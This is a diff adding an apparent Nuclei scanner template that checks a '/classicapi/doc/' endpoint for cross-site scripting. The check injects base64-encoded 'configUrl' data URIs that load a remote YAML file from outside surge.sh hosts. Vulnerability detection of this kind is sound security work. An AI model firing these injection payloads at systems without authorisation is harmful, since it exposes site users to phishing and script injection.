@@ -1,0 +1,26 @@
+id: classic_api_xss
+info:
+  name: Classic API XSS
+  author: Mr_Vill4in
+  severity: high 
+  description: Classic API XSS
+  reference: https://OWASP.com
+    - https://hackerone.com/reports/1444682
+  tags: xss
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ=="
+      - "{{BaseURL}}/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjogImh0dHBzOi8vdGVhcmZ1bC1lYXJ0aC5zdXJnZS5zaC90ZXN0LnlhbWwiLAp9"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "test.yaml"
+          - "physhing"
